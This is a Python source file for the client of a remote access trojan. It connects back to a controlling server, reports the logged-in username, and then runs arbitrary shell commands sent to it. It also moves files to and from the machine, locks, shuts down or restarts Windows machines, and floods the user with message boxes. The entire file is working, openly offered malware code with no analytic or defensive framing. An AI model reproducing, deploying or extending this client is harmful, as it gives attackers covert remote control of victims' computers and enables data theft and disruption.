import socket
import subprocess
import time
import json
import os
import base64
import ctypes
import os
import sys
import threading


class RatConnector:
    def __init__(self, ip, port):
        # Try to connect to the server, if failed wait five seconds and try again.
        while True:
            try:
                self.connection = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
                self.connection.connect((ip, port))
                self.data_send(os.getlogin())
            except socket.error:
                time.sleep(5)
            else:
                break

    # Function for sending data as JSON
    def data_send(self, data):
        jsonData = json.dumps(data)
        self.connection.send(jsonData.encode())

    # Function for receiving data as JSON
    def data_receive(self):
        jsonData = b""
        while True:
            try:
                jsonData += self.connection.recv(1024)
                return json.loads(jsonData)
            # If ValueError returned then more data needs to be sent
            except ValueError:
                continue

    def array_to_string(self, s):
        convStr = ""
        for i in s:
            convStr += " " + i 
        return convStr

    # Run any command on the system
    def run_command(self, command):
        return subprocess.check_output(
            command, shell=True, stderr=subprocess.DEVNULL, stdin=subprocess.DEVNULL
        )

    # Reading files with base 64 encoding for non UTF-8 compatability
    def read_file(self, path):
        with open(path, "rb") as file:
            return base64.b64encode(file.read())

    # Writing files, decode the b64 from the above function
    def write_file(self, path, content):
        with open(path, "wb") as file:
            file.write(base64.b64decode(content))
            return "[+] Upload complete"

    def message_box(self, message, type):
        if type == "messagebomb":
            for i in range(100):
                ctypes.windll.user32.MessageBoxW(
                    0, message, "Message from remote admin", 1
                )
        else:
            ctypes.windll.user32.MessageBoxW(0, message, "Message from remote admin", 1)

    def run(self):
        while True:
            command = self.data_receive()
            try:
                if command[0] == "exit":
                    self.connection.close()
                    sys.exit()
                elif command[0] == "ratHelp":
                    commandResponse = ""
                elif command[0] == "cd" and len(command) > 1:
                    os.chdir(command[1])
                    commandResponse = "[+] Changing active directory to " + command[1]
                elif command[0] == "upload":
                    commandResponse = self.write_file(command[1], command[2])
                elif command[0] == "download":
                    commandResponse = self.read_file(command[1]).decode()
                elif command[0] == "message":
                    # Shows a message box with the requested message using ctypes
                    messageThread = threading.Thread(
                        target=self.message_box,
                        args=(
                            command[1],
                            command[0],
                        ),
                    )
                    messageThread.start()
                    commandResponse = "[+] Message sent to client"
                elif command[0] == "messagebomb":
                    # Shows a message box with the requested message using ctypes
                    messageThread = threading.Thread(
                        target=self.message_box,
                        args=(
                            command[1],
                            command[0],
                        ),
                    )
                    messageThread.start()
                    commandResponse = "[+] Message sent to client"
                elif command[0] == "lock":
                    ctypes.windll.user32.LockWorkStation()
                    commandResponse = "[+] Clients PC locked"
                elif command[0] == "shutdown":
                    os.system("shutdown /s /t 1")
                elif command[0] == "restart":
                    os.system("shutdown /r /t 1")
                else:
                    convCommand = self.array_to_string(command)
                    commandResponse = self.run_command(convCommand).decode()
            # Whole error handling, bad practice but required to keep connection
            except Exception as e:
                commandResponse = f"[-] Error running command: {e}"
            self.data_send(commandResponse)


ratClient = RatConnector("127.0.0.1", 7976)
ratClient.run()
